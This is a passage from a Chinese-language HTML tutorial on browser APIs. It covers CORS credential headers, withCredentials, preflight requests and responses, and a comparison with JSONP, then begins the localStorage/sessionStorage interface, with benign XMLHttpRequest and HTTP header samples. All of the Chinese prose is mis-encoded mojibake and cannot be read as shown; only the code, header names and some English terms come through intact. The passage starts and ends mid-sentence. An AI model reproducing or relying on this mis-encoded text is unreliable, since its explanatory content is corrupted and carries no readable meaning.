è¯·æ±‚ä¹‹ä¸­ã€‚è®¾ä¸º<code>true</code>ï¼Œå³è¡¨ç¤ºæœåŠ¡å™¨æ˜ç¡®è®¸å¯ï¼Œæµè§ˆå™¨å¯ä»¥æŠŠ Cookie åŒ…å«åœ¨è¯·æ±‚ä¸­ï¼Œä¸€èµ·å‘ç»™æœåŠ¡å™¨ã€‚è¿™ä¸ªå€¼ä¹Ÿåªèƒ½è®¾ä¸º<code>true</code>ï¼Œå¦‚æœæœåŠ¡å™¨ä¸è¦æµè§ˆå™¨å‘é€ Cookieï¼Œä¸å‘é€è¯¥å­—æ®µå³å¯ã€‚</p> <p><strong>ï¼ˆ3ï¼‰<code>Access-Control-Expose-Headers</code></strong></p> <p>è¯¥å­—æ®µå¯é€‰ã€‚CORS è¯·æ±‚æ—¶ï¼Œ<code>XMLHttpRequest</code>å¯¹è±¡çš„<code>getResponseHeader()</code>æ–¹æ³•åªèƒ½æ‹¿åˆ°6ä¸ªæœåŠ¡å™¨è¿”å›çš„åŸºæœ¬å­—æ®µï¼š<code>Cache-Control</code>ã€<code>Content-Language</code>ã€<code>Content-Type</code>ã€<code>Expires</code>ã€<code>Last-Modified</code>ã€<code>Pragma</code>ã€‚å¦‚æœæƒ³æ‹¿åˆ°å…¶ä»–å­—æ®µï¼Œå°±å¿…é¡»åœ¨<code>Access-Control-Expose-Headers</code>é‡Œé¢æŒ‡å®šã€‚ä¸Šé¢çš„ä¾‹å­æŒ‡å®šï¼Œ<code>getResponseHeader('FooBar')</code>å¯ä»¥è¿”å›<code>FooBar</code>å­—æ®µçš„å€¼ã€‚</p> <h3 id="withcredentials-å±æ€§"><a href="#withcredentials-å±æ€§" class="header-anchor">#</a> withCredentials å±æ€§</h3> <p>ä¸Šé¢è¯´åˆ°ï¼ŒCORS è¯·æ±‚é»˜è®¤ä¸åŒ…å« Cookie ä¿¡æ¯ï¼ˆä»¥åŠ HTTP è®¤è¯ä¿¡æ¯ç­‰ï¼‰ï¼Œè¿™æ˜¯ä¸ºäº†é™ä½ CSRF æ”»å‡»çš„é£é™©ã€‚ä½†æ˜¯æŸäº›åœºåˆï¼ŒæœåŠ¡å™¨å¯èƒ½éœ€è¦æ‹¿åˆ° Cookieï¼Œè¿™æ—¶éœ€è¦æœåŠ¡å™¨æ˜¾å¼æŒ‡å®š<code>Access-Control-Allow-Credentials</code>å­—æ®µï¼Œå‘Šè¯‰æµè§ˆå™¨å¯ä»¥å‘é€ Cookieã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Access-Control-Allow-Credentials:</span> true
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>åŒæ—¶ï¼Œå¼€å‘è€…å¿…é¡»åœ¨ AJAX è¯·æ±‚ä¸­æ‰“å¼€<code>withCredentials</code>å±æ€§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>å¦åˆ™ï¼Œå³ä½¿æœåŠ¡å™¨è¦æ±‚å‘é€ Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå‘é€ã€‚æˆ–è€…ï¼ŒæœåŠ¡å™¨è¦æ±‚è®¾ç½® Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå¤„ç†ã€‚</p> <p>ä½†æ˜¯ï¼Œæœ‰çš„æµè§ˆå™¨é»˜è®¤å°†<code>withCredentials</code>å±æ€§è®¾ä¸º<code>true</code>ã€‚è¿™å¯¼è‡´å¦‚æœçœç•¥<code>withCredentials</code>è®¾ç½®ï¼Œè¿™äº›æµè§ˆå™¨å¯èƒ½è¿˜æ˜¯ä¼šä¸€èµ·å‘é€ Cookieã€‚è¿™æ—¶ï¼Œå¯ä»¥æ˜¾å¼å…³é—­<code>withCredentials</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæœåŠ¡å™¨è¦æ±‚æµè§ˆå™¨å‘é€ Cookieï¼Œ<code>Access-Control-Allow-Origin</code>å°±ä¸èƒ½è®¾ä¸ºæ˜Ÿå·ï¼Œå¿…é¡»æŒ‡å®šæ˜ç¡®çš„ã€ä¸è¯·æ±‚ç½‘é¡µä¸€è‡´çš„åŸŸåã€‚åŒæ—¶ï¼ŒCookie ä¾ç„¶éµå¾ªåŒæºæ”¿ç­–ï¼Œåªæœ‰ç”¨æœåŠ¡å™¨åŸŸåè®¾ç½®çš„ Cookie æ‰ä¼šä¸Šä¼ ï¼Œå…¶ä»–åŸŸåçš„ Cookie å¹¶ä¸ä¼šä¸Šä¼ ï¼Œä¸”ï¼ˆè·¨åŸŸï¼‰åŸç½‘é¡µä»£ç ä¸­çš„<code>document.cookie</code>ä¹Ÿæ— æ³•è¯»å–æœåŠ¡å™¨åŸŸåä¸‹çš„ Cookieã€‚</p> <h2 id="_4-éç®€å•è¯·æ±‚"><a href="#_4-éç®€å•è¯·æ±‚" class="header-anchor">#</a> 4.éç®€å•è¯·æ±‚</h2> <h3 id="é¢„æ£€è¯·æ±‚"><a href="#é¢„æ£€è¯·æ±‚" class="header-anchor">#</a> é¢„æ£€è¯·æ±‚</h3> <p>éç®€å•è¯·æ±‚æ˜¯é‚£ç§å¯¹æœåŠ¡å™¨æå‡ºç‰¹æ®Šè¦æ±‚çš„è¯·æ±‚ï¼Œæ¯”å¦‚è¯·æ±‚æ–¹æ³•æ˜¯<code>PUT</code>æˆ–<code>DELETE</code>ï¼Œæˆ–è€…<code>Content-Type</code>å­—æ®µçš„ç±»å‹æ˜¯<code>application/json</code>ã€‚</p> <p>éç®€å•è¯·æ±‚çš„ CORS è¯·æ±‚ï¼Œä¼šåœ¨æ­£å¼é€šä¿¡ä¹‹å‰ï¼Œå¢åŠ ä¸€æ¬¡ HTTP æŸ¥è¯¢è¯·æ±‚ï¼Œç§°ä¸ºâ€œé¢„æ£€â€è¯·æ±‚ï¼ˆpreflightï¼‰ã€‚æµè§ˆå™¨å…ˆè¯¢é—®æœåŠ¡å™¨ï¼Œå½“å‰ç½‘é¡µæ‰€åœ¨çš„åŸŸåæ˜¯å¦åœ¨æœåŠ¡å™¨çš„è®¸å¯åå•ä¹‹ä¸­ï¼Œä»¥åŠå¯ä»¥ä½¿ç”¨å“ªäº› HTTP æ–¹æ³•å’Œå¤´ä¿¡æ¯å­—æ®µã€‚åªæœ‰å¾—åˆ°è‚¯å®šç­”å¤ï¼Œæµè§ˆå™¨æ‰ä¼šå‘å‡ºæ­£å¼çš„<code>XMLHttpRequest</code>è¯·æ±‚ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢è¿™äº›æ–°å¢çš„è¯·æ±‚ï¼Œå¯¹ä¼ ç»Ÿçš„æ²¡æœ‰ CORS æ”¯æŒçš„æœåŠ¡å™¨å½¢æˆå‹åŠ›ï¼Œç»™æœåŠ¡å™¨ä¸€ä¸ªæå‰æ‹’ç»çš„æœºä¼šï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢æœåŠ¡å™¨æ”¶åˆ°å¤§é‡<code>DELETE</code>å’Œ<code>PUT</code>è¯·æ±‚ï¼Œè¿™äº›ä¼ ç»Ÿçš„è¡¨å•ä¸å¯èƒ½è·¨åŸŸå‘å‡ºçš„è¯·æ±‚ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€æ®µæµè§ˆå™¨çš„ JavaScript è„šæœ¬ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'http://api.alice.com/cors'</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'PUT'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'X-Custom-Header'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒHTTP è¯·æ±‚çš„æ–¹æ³•æ˜¯<code>PUT</code>ï¼Œå¹¶ä¸”å‘é€ä¸€ä¸ªè‡ªå®šä¹‰å¤´ä¿¡æ¯<code>X-Custom-Header</code>ã€‚</p> <p>æµè§ˆå™¨å‘ç°ï¼Œè¿™æ˜¯ä¸€ä¸ªéç®€å•è¯·æ±‚ï¼Œå°±è‡ªåŠ¨å‘å‡ºä¸€ä¸ªâ€œé¢„æ£€â€è¯·æ±‚ï¼Œè¦æ±‚æœåŠ¡å™¨ç¡®è®¤å¯ä»¥è¿™æ ·è¯·æ±‚ã€‚ä¸‹é¢æ˜¯è¿™ä¸ªâ€œé¢„æ£€â€è¯·æ±‚çš„ HTTP å¤´ä¿¡æ¯ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">OPTIONS</span> /cors HTTP/1.1</span>
<span class="token header-name keyword">Origin:</span> http://api.bob.com
<span class="token header-name keyword">Access-Control-Request-Method:</span> PUT
<span class="token header-name keyword">Access-Control-Request-Headers:</span> X-Custom-Header
<span class="token header-name keyword">Host:</span> api.alice.com
<span class="token header-name keyword">Accept-Language:</span> en-US
<span class="token header-name keyword">Connection:</span> keep-alive
<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0...
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>â€œé¢„æ£€â€è¯·æ±‚ç”¨çš„è¯·æ±‚æ–¹æ³•æ˜¯<code>OPTIONS</code>ï¼Œè¡¨ç¤ºè¿™ä¸ªè¯·æ±‚æ˜¯ç”¨æ¥è¯¢é—®çš„ã€‚å¤´ä¿¡æ¯é‡Œé¢ï¼Œå…³é”®å­—æ®µæ˜¯<code>Origin</code>ï¼Œè¡¨ç¤ºè¯·æ±‚æ¥è‡ªå“ªä¸ªæºã€‚</p> <p>é™¤äº†<code>Origin</code>å­—æ®µï¼Œâ€œé¢„æ£€â€è¯·æ±‚çš„å¤´ä¿¡æ¯åŒ…æ‹¬ä¸¤ä¸ªç‰¹æ®Šå­—æ®µã€‚</p> <p><strong>ï¼ˆ1ï¼‰<code>Access-Control-Request-Method</code></strong></p> <p>è¯¥å­—æ®µæ˜¯å¿…é¡»çš„ï¼Œç”¨æ¥åˆ—å‡ºæµè§ˆå™¨çš„ CORS è¯·æ±‚ä¼šç”¨åˆ°å“ªäº› HTTP æ–¹æ³•ï¼Œä¸Šä¾‹æ˜¯<code>PUT</code>ã€‚</p> <p><strong>ï¼ˆ2ï¼‰<code>Access-Control-Request-Headers</code></strong></p> <p>è¯¥å­—æ®µæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼ŒæŒ‡å®šæµè§ˆå™¨ CORS è¯·æ±‚ä¼šé¢å¤–å‘é€çš„å¤´ä¿¡æ¯å­—æ®µï¼Œä¸Šä¾‹æ˜¯<code>X-Custom-Header</code>ã€‚</p> <h3 id="é¢„æ£€è¯·æ±‚çš„å›åº”"><a href="#é¢„æ£€è¯·æ±‚çš„å›åº”" class="header-anchor">#</a> é¢„æ£€è¯·æ±‚çš„å›åº”</h3> <p>æœåŠ¡å™¨æ”¶åˆ°â€œé¢„æ£€â€è¯·æ±‚ä»¥åï¼Œæ£€æŸ¥äº†<code>Origin</code>ã€<code>Access-Control-Request-Method</code>å’Œ<code>Access-Control-Request-Headers</code>å­—æ®µä»¥åï¼Œç¡®è®¤å…è®¸è·¨æºè¯·æ±‚ï¼Œå°±å¯ä»¥åšå‡ºå›åº”ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token response-status">HTTP/1.1 <span class="token property">200 OK</span></span>
<span class="token header-name keyword">Date:</span> Mon, 01 Dec 2008 01:15:39 GMT
<span class="token header-name keyword">Server:</span> Apache/2.0.61 (Unix)
<span class="token header-name keyword">Access-Control-Allow-Origin:</span> http://api.bob.com
<span class="token header-name keyword">Access-Control-Allow-Methods:</span> GET, POST, PUT
<span class="token header-name keyword">Access-Control-Allow-Headers:</span> X-Custom-Header
<span class="token header-name keyword">Content-Type:</span> text/html; charset=utf-8
<span class="token header-name keyword">Content-Encoding:</span> gzip
<span class="token header-name keyword">Content-Length:</span> 0
<span class="token header-name keyword">Keep-Alive:</span> timeout=2, max=100
<span class="token header-name keyword">Connection:</span> Keep-Alive
<span class="token header-name keyword">Content-Type:</span> text/plain
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>ä¸Šé¢çš„ HTTP å›åº”ä¸­ï¼Œå…³é”®çš„æ˜¯<code>Access-Control-Allow-Origin</code>å­—æ®µï¼Œè¡¨ç¤º<code>http://api.bob.com</code>å¯ä»¥è¯·æ±‚æ•°æ®ã€‚è¯¥å­—æ®µä¹Ÿå¯ä»¥è®¾ä¸ºæ˜Ÿå·ï¼Œè¡¨ç¤ºåŒæ„ä»»æ„è·¨æºè¯·æ±‚ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Access-Control-Allow-Origin:</span> *
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å¦‚æœæœåŠ¡å™¨å¦å®šäº†â€œé¢„æ£€â€è¯·æ±‚ï¼Œä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½• CORS ç›¸å…³çš„å¤´ä¿¡æ¯å­—æ®µï¼Œæˆ–è€…æ˜ç¡®è¡¨ç¤ºè¯·æ±‚ä¸ç¬¦åˆæ¡ä»¶ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">OPTIONS</span> http://api.bob.com HTTP/1.1</span>
<span class="token header-name keyword">Status:</span> 200
<span class="token header-name keyword">Access-Control-Allow-Origin:</span> https://notyourdomain.com
<span class="token header-name keyword">Access-Control-Allow-Method:</span> POST
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢çš„æœåŠ¡å™¨å›åº”ï¼Œ<code>Access-Control-Allow-Origin</code>å­—æ®µæ˜ç¡®ä¸åŒ…æ‹¬å‘å‡ºè¯·æ±‚çš„<code>http://api.bob.com</code>ã€‚</p> <p>è¿™æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šè®¤å®šï¼ŒæœåŠ¡å™¨ä¸åŒæ„é¢„æ£€è¯·æ±‚ï¼Œå› æ­¤è§¦å‘ä¸€ä¸ªé”™è¯¯ï¼Œè¢«<code>XMLHttpRequest</code>å¯¹è±¡çš„<code>onerror</code>å›è°ƒå‡½æ•°æ•è·ã€‚æ§åˆ¶å°ä¼šæ‰“å°å‡ºå¦‚ä¸‹çš„æŠ¥é”™ä¿¡æ¯ã€‚</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>XMLHttpRequest cannot load http://api.alice.com.
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æœåŠ¡å™¨å›åº”çš„å…¶ä»– CORS ç›¸å…³å­—æ®µå¦‚ä¸‹ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Access-Control-Allow-Methods:</span> GET, POST, PUT
<span class="token header-name keyword">Access-Control-Allow-Headers:</span> X-Custom-Header
<span class="token header-name keyword">Access-Control-Allow-Credentials:</span> true
<span class="token header-name keyword">Access-Control-Max-Age:</span> 1728000
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>ï¼ˆ1ï¼‰<code>Access-Control-Allow-Methods</code></strong></p> <p>è¯¥å­—æ®µå¿…éœ€ï¼Œå®ƒçš„å€¼æ˜¯é€—å·åˆ†éš”çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰è·¨åŸŸè¯·æ±‚çš„æ–¹æ³•ã€‚æ³¨æ„ï¼Œè¿”å›çš„æ˜¯æ‰€æœ‰æ”¯æŒçš„æ–¹æ³•ï¼Œè€Œä¸å•æ˜¯æµè§ˆå™¨è¯·æ±‚çš„é‚£ä¸ªæ–¹æ³•ã€‚è¿™æ˜¯ä¸ºäº†é¿å…å¤šæ¬¡â€œé¢„æ£€â€è¯·æ±‚ã€‚</p> <p><strong>ï¼ˆ2ï¼‰<code>Access-Control-Allow-Headers</code></strong></p> <p>å¦‚æœæµè§ˆå™¨è¯·æ±‚åŒ…æ‹¬<code>Access-Control-Request-Headers</code>å­—æ®µï¼Œåˆ™<code>Access-Control-Allow-Headers</code>å­—æ®µæ˜¯å¿…éœ€çš„ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰å¤´ä¿¡æ¯å­—æ®µï¼Œä¸é™äºæµè§ˆå™¨åœ¨â€œé¢„æ£€â€ä¸­è¯·æ±‚çš„å­—æ®µã€‚</p> <p><strong>ï¼ˆ3ï¼‰<code>Access-Control-Allow-Credentials</code></strong></p> <p>è¯¥å­—æ®µä¸ç®€å•è¯·æ±‚æ—¶çš„å«ä¹‰ç›¸åŒã€‚</p> <p><strong>ï¼ˆ4ï¼‰<code>Access-Control-Max-Age</code></strong></p> <p>è¯¥å­—æ®µå¯é€‰ï¼Œç”¨æ¥æŒ‡å®šæœ¬æ¬¡é¢„æ£€è¯·æ±‚çš„æœ‰æ•ˆæœŸï¼Œå•ä½ä¸ºç§’ã€‚ä¸Šé¢ç»“æœä¸­ï¼Œæœ‰æ•ˆæœŸæ˜¯20å¤©ï¼ˆ1728000ç§’ï¼‰ï¼Œå³å…è®¸ç¼“å­˜è¯¥æ¡å›åº”1728000ç§’ï¼ˆå³20å¤©ï¼‰ï¼Œåœ¨æ­¤æœŸé—´ï¼Œä¸ç”¨å‘å‡ºå¦ä¸€æ¡é¢„æ£€è¯·æ±‚ã€‚</p> <h3 id="æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”"><a href="#æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”" class="header-anchor">#</a> æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº”</h3> <p>ä¸€æ—¦æœåŠ¡å™¨é€šè¿‡äº†â€œé¢„æ£€â€è¯·æ±‚ï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨æ­£å¸¸çš„ CORS è¯·æ±‚ï¼Œå°±éƒ½è·Ÿç®€å•è¯·æ±‚ä¸€æ ·ï¼Œä¼šæœ‰ä¸€ä¸ª<code>Origin</code>å¤´ä¿¡æ¯å­—æ®µã€‚æœåŠ¡å™¨çš„å›åº”ï¼Œä¹Ÿéƒ½ä¼šæœ‰ä¸€ä¸ª<code>Access-Control-Allow-Origin</code>å¤´ä¿¡æ¯å­—æ®µã€‚</p> <p>ä¸‹é¢æ˜¯â€œé¢„æ£€â€è¯·æ±‚ä¹‹åï¼Œæµè§ˆå™¨çš„æ­£å¸¸ CORS è¯·æ±‚ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">PUT</span> /cors HTTP/1.1</span>
<span class="token header-name keyword">Origin:</span> http://api.bob.com
<span class="token header-name keyword">Host:</span> api.alice.com
<span class="token header-name keyword">X-Custom-Header:</span> value
<span class="token header-name keyword">Accept-Language:</span> en-US
<span class="token header-name keyword">Connection:</span> keep-alive
<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0...
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢å¤´ä¿¡æ¯çš„<code>Origin</code>å­—æ®µæ˜¯æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ çš„ã€‚</p> <p>ä¸‹é¢æ˜¯æœåŠ¡å™¨æ­£å¸¸çš„å›åº”ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Access-Control-Allow-Origin:</span> http://api.bob.com
<span class="token header-name keyword">Content-Type:</span> text/html; charset=utf-8
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢å¤´ä¿¡æ¯ä¸­ï¼Œ<code>Access-Control-Allow-Origin</code>å­—æ®µæ˜¯æ¯æ¬¡å›åº”éƒ½å¿…å®šåŒ…å«çš„ã€‚</p> <h2 id="_5-ä¸-jsonp-çš„æ¯”è¾ƒ"><a href="#_5-ä¸-jsonp-çš„æ¯”è¾ƒ" class="header-anchor">#</a> 5.ä¸ JSONP çš„æ¯”è¾ƒ</h2> <p>CORS ä¸ JSONP çš„ä½¿ç”¨ç›®çš„ç›¸åŒï¼Œä½†æ˜¯æ¯” JSONP æ›´å¼ºå¤§ã€‚JSONP åªæ”¯æŒ<code>GET</code>è¯·æ±‚ï¼ŒCORS æ”¯æŒæ‰€æœ‰ç±»å‹çš„ HTTP è¯·æ±‚ã€‚JSONP çš„ä¼˜åŠ¿åœ¨äºæ”¯æŒè€å¼æµè§ˆå™¨ï¼Œä»¥åŠå¯ä»¥å‘ä¸æ”¯æŒ CORS çš„ç½‘ç«™è¯·æ±‚æ•°æ®ã€‚</p> <h2 id="ä¸ƒã€storage-æ¥å£"><a href="#ä¸ƒã€storage-æ¥å£" class="header-anchor">#</a> ä¸ƒã€Storage æ¥å£</h2> <h2 id="_1-æ¦‚è¿°-3"><a href="#_1-æ¦‚è¿°-3" class="header-anchor">#</a> 1.æ¦‚è¿°</h2> <p>Storage æ¥å£ç”¨äºè„šæœ¬åœ¨æµè§ˆå™¨ä¿å­˜æ•°æ®ã€‚ä¸¤ä¸ªå¯¹è±¡éƒ¨ç½²äº†è¿™ä¸ªæ¥å£ï¼š<code>window.sessionStorage</code>å’Œ<code>window.localStorage</code>ã€‚</p> <p><code>sessionStorage</code>ä¿å­˜çš„æ•°æ®ç”¨äºæµè§ˆå™¨çš„ä¸€æ¬¡ä¼šè¯ï¼ˆsessionï¼‰ï¼Œå½“ä¼šè¯ç»“æŸï¼ˆé€šå¸¸æ˜¯çª—å£å…³é—­ï¼‰ï¼Œæ•°æ®è¢«æ¸…ç©ºï¼›<code>localStorage</code>ä¿å­˜çš„æ•°æ®é•¿æœŸå­˜åœ¨ï¼Œä¸‹ä¸€æ¬¡è®¿é—®è¯¥ç½‘ç«™çš„æ—¶å€™ï¼Œç½‘é¡µå¯ä»¥ç›´æ¥è¯»å–ä»¥å‰ä¿å­˜çš„æ•°æ®ã€‚é™¤äº†ä¿å­˜æœŸé™çš„é•¿çŸ­ä¸åŒï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡çš„å…¶ä»–æ–¹é¢éƒ½ä¸€è‡´ã€‚</p> <p>ä¿å­˜çš„æ•°æ®éƒ½ä»¥â€œé”®å€¼å¯¹â€çš„å½¢å¼å­˜åœ¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸€é¡¹æ•°æ®éƒ½æœ‰ä¸€ä¸ªé”®åå’Œå¯¹åº”çš„å€¼ã€‚æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯ä»¥æ–‡æœ¬æ ¼å¼ä¿å­˜ã€‚</p> <p>è¿™ä¸ªæ¥å£å¾ˆåƒ Cookie çš„å¼ºåŒ–ç‰ˆï¼Œèƒ½å¤Ÿä½¿ç”¨å¤§å¾—å¤šçš„å­˜å‚¨ç©ºé—´ã€‚ç›®å‰ï¼Œæ¯ä¸ªåŸŸåçš„å­˜å‚¨ä¸Šé™è§†æµè§ˆå™¨è€Œå®šï¼ŒChrome æ˜¯ 2.5MBï¼ŒFirefox å’Œ Opera æ˜¯ 5MBï¼ŒIE æ˜¯ 10MBã€‚å…¶ä¸­ï¼ŒFirefox çš„å­˜å‚¨ç©ºé—´ç”±ä¸€çº§åŸŸåå†³å®šï¼Œè€Œå…¶ä»–æµè§ˆå™¨æ²¡æœ‰è¿™ä¸ªé™åˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒFirefox ä¸­ï¼Œ<code>a.example.com</code>å’Œ<code>b.example.com</code>å…±äº« 5MB çš„å­˜å‚¨ç©ºé—´ã€‚å¦å¤–ï¼Œä¸ Cookie ä¸€æ ·ï¼Œå®ƒä»¬ä¹Ÿå—åŒåŸŸé™åˆ¶ã€‚æŸä¸ªç½‘é¡µå­˜å…¥çš„æ•°æ®ï¼Œåªæœ‰åŒåŸŸä¸‹çš„ç½‘é¡µæ‰èƒ½è¯»å–ï¼Œå¦‚æœè·¨åŸŸæ“ä½œä¼šæŠ¥é”™ã€‚</p> <h2 id="_2-å±æ€§å’Œæ–¹æ³•"><a href="#_2-å±æ€§å’Œæ–¹æ³•" class="header-anchor">#</a> 2.å±æ€§å’Œæ–¹æ³•</h2> <p>Storage æ¥å£åªæœ‰ä¸€ä¸ªå±æ€§ã€‚</p> <ul><li><code>Storage.length</code>ï¼šè¿”å›ä¿å­˜çš„æ•°æ®é¡¹ä¸ªæ•°ã€‚</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'baz'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

window<span class="token punctuation">.</span>localStorage<span class="token punctuation">.</span>length <span class="token comment">// 3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>è¯¥æ¥å£æä¾›5ä¸ªæ–¹æ³•ã€‚</p> <h3 id="storage-setitem"><a href="#storage-setitem" class="header-anchor">#</a> Storage.setItem()</h3> <p><code>Storage.setItem()</code>æ–¹æ³•ç”¨äºå­˜å…¥æ•°æ®ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯é”®åï¼Œç¬¬äºŒä¸ªæ˜¯ä¿å­˜çš„æ•°æ®ã€‚å¦‚æœé”®åå·²ç»å­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šæ›´æ–°å·²æœ‰çš„é”®å€¼ã€‚è¯¥æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>sessionStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
